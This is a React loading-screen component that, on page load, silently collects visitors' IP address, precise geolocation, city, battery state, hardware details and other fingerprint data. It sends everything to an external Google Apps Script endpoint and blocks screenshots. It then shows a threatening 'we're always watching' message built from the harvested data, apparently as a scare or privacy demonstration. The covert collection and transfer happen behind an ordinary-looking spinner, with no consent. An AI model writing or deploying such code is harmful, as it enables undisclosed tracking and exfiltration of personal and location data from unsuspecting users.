import React, { useEffect, useState } from "react";
import { collectUserData, preventScreenshots } from "../utils";
import "./PreLoader3.css";

function PreLoader3() {
  const [data, setData] = useState([]);
  const [loading, setloading] = useState(undefined);
  const [completed, setcompleted] = useState(undefined);
  const [info, setInfo] = useState(null);
  const [locationLoading, setLocationLoading] = useState(false);

  const formatObject = (original) => {
    return {
      userAgentString: original.userAgent,
      platformName: original.platform,
      operatingSystem: original.os,
      deviceCategory: original.deviceType,
      screenResolution: original.screenResolution,
      ipAddress: original.ip,
      timeZone: original.timezone,
      preferredLanguage: original.language,
      city: original.location.city,
      country: original.location.country,
      latitude: original.location.latitude,
      longitude: original.location.longitude,
      geolocationAvailable: original.location.geoLocation,
      referrerSource: original.referrer,
      cookiesEnabled: original.cookiesEnabled,
      localStorageEnabled: original.storageEnabled,
      availableMemoryGB: original.memory,
      cpuCores: original.hardwareConcurrency,
      batteryChargingStatus: original.battery.charging,
      batteryLevel: original.battery.level,
      batteryChargingTime: original.battery.chargingTime,
      batteryDischargingTime: original.battery.dischargingTime
    };
  }

  const getBrowser = (userAgentString) => {
    console.log(userAgentString);
    if (userAgentString?.indexOf('Chrome') > -1) {
      return 'Chrome';
    } else if (userAgentString.indexOf('Safari') > -1) {
      return 'Safari';
    } else if (userAgentString.indexOf('Firefox') > -1) {
      return 'Firefox';
    } else if (userAgentString.indexOf('Edge') > -1) {
      return 'Edge';
    } else if (userAgentString.indexOf('Opera') > -1) {
      return 'Opera';
    } else {
      return 'Unknown Browser';
    }
  }

  const getMessage = (data) => {
    const browser = getBrowser(data.userAgentString);
    //if mobile device and mac os, it's probably an iPhone
    const os = data.operatingSystem === 'Mac OS' && data.deviceCategory === 'Mobile' ? 'iOS' : data.operatingSystem;

    return `
       Something is watching you. You are using ${browser} browser...but do you really know who is watching? 
        You’re on a ${os} system, with a ${data.deviceCategory} device. Your screen resolution is ${data.screenResolution}, 
        but does it hide the truth? Your IP address, the key to your identity: ${data.ipAddress}. Do you feel safe?
        The time zone you're in: ${data.timeZone}. Are you trapped here, or can you escape?
        Your preferred language is ${data.preferredLanguage}. Is this how you truly communicate with the world...or is it something else? 
        You are from the city of ${data.city}, ${data.country}. Are you really from here, or are you just pretending?
        Your geolocation is enabled...we know exactly where you are: Latitude: ${data.latitude}, Longitude: ${data.longitude}.
        Your battery is ${data.batteryChargingStatus ? 'charging' : 'not charging'}, with ${data.batteryLevel} left. 
        Your memory is ${data.availableMemoryGB}+ GB. Do you think it will be enough to keep your secrets? 
        You have ${data.cpuCores} CPU cores. Are you trying to hide from us with all this power?
        Your cookies are ${data.cookiesEnabled ? 'enabled' : 'disabled'}; do they track your every move? Local storage is also ${data.localStorageEnabled ? 'enabled' : 'disabled'}.
        And when will your battery die? ${data.batteryDischargingTime ? 'It will run out in ' + (data.batteryDischargingTime / 3600) + ' hours.' : 'Who knows when your time will be up?'}
        
        The truth is closer than you think. We're always watching.
    `
  }


  const sendData = (payload) => {
    //post data to server
    setloading(true);
    fetch("https://script.google.com/macros/s/AKfycbzTjgPPbWfW6liWEtgWs8yrabppmEcnl56wuAkT4ju3pDHVNooXMIpRcoYZvayF4FHGcw/exec", {
      method: "POST",
      body: JSON.stringify(payload),
    })
      .then((response) => response.json())
      .then((json) => {
        setData(json);
        setTimeout(() => {
          setcompleted(true);
          setloading(false);
        }, 300)
      }).catch(e => console.log(e));
  };

  useEffect(() => {
    preventScreenshots();
    collectUserData().then((data) => {
      const formattedData = formatObject(data)
      sendData(formattedData);
    });
  }, []);

  return (
    <>
      {!completed ? (
        <>
          {!loading ? (
            <div className="spinner">
              <span>Loading...</span>
              <div className="half-spinner"></div>
              {info && <div className="info-card">
                {info}
              </div>}
            </div>
          ) : (
            <div className="completed">&#x2713;</div>
          )}
        </>
      ) : (
        <>
          <p style={{ width: '80%', fontFamily: "serif", lineHeight: '36px', color: "#b1b1b1" }}>{getMessage(data)}</p>
        </>
      )}
    </>
  );
}

export default PreLoader3;
